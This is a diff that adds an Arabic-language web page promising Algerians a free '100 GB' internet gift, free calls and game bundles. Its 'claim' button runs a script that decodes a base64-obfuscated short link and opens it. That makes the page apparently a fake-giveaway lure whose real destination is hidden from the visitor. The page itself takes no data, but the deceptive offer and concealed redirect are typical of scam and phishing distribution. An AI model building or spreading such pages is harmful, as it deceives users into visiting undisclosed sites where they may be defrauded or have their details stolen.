@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>هدايا الجزائر</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+            background: #000;
+            padding: 20px;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .card {
+            background: #1a1a1a;
+            border: 2px solid #ffd700;
+            border-radius: 15px;
+            padding: 25px;
+            max-width: 380px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 10px 25px rgba(255,215,0,0.3);
+        }
+
+        .flag {
+            font-size: 28px;
+            margin-bottom: 10px;
+        }
+
+        .title {
+            background: #ffd700;
+            color: #000;
+            padding: 12px;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: bold;
+            margin-bottom: 15px;
+        }
+
+        .gift {
+            background: #000;
+            border: 2px solid #ffd700;
+            color: #ffd700;
+            padding: 20px;
+            border-radius: 12px;
+            margin: 15px 0;
+        }
+
+        .gift-number {
+            font-size: 40px;
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+
+        .gift-text {
+            font-size: 16px;
+        }
+
+        .offers {
+            background: #2a2a2a;
+            border: 1px solid #ffd700;
+            padding: 15px;
+            border-radius: 10px;
+            margin: 15px 0;
+            text-align: right;
+        }
+
+        .offer {
+            margin: 8px 0;
+            font-size: 14px;
+            color: #fff;
+        }
+
+        .btn {
+            background: #ffd700;
+            color: #000;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 25px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            margin: 15px 0;
+            transition: all 0.3s;
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+            background: #ffed4e;
+            box-shadow: 0 5px 15px rgba(255,215,0,0.4);
+        }
+
+        .note {
+            font-size: 11px;
+            color: #ccc;
+            margin-top: 10px;
+        }
+
+        @media (max-width: 400px) {
+            .card { padding: 20px; margin: 10px; }
+            .gift-number { font-size: 30px; }
+            .btn { font-size: 14px; padding: 12px 25px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="flag">🇩🇿</div>
+        
+        <div class="title">
+            🎁 هدايا الجزائر اليومية
+        </div>
+
+        <div class="gift">
+            <div class="gift-number">100 جيجا</div>
+            <div class="gift-text">هدية مجانية</div>
+        </div>
+
+        <div class="offers">
+            <div class="offer">📶 100 جيجا إنترنت</div>
+            <div class="offer">📞 مكالمات مجانية</div>
+            <div class="offer">🎮 باقات الألعاب</div>
+            <div class="offer">📱 عروض خاصة</div>
+        </div>
+
+        <button class="btn" onclick="claim()">
+            🎯 احصل على هديتك الآن
+        </button>
+
+        <div class="note">
+            إعلان ترويجي - شروط الشركة المقدمة
+        </div>
+    </div>
+
+    <script>
+        const link = 'aHR0cHM6Ly9iY25zLmxpbmsvdGhQM1dv';
+        
+        function claim() {
+            const btn = document.querySelector('.btn');
+            btn.innerHTML = '⏳ جاري التحويل...';
+            btn.disabled = true;
+            
+            setTimeout(() => {
+                window.open(atob(link), '_blank');
+                btn.innerHTML = '✅ تم!';
+                setTimeout(() => {
+                    btn.innerHTML = '🎯 احصل على هديتك الآن';
+                    btn.disabled = false;
+                }, 2000);
+            }, 1000);
+        }
+    </script>
+</body>
+</html>
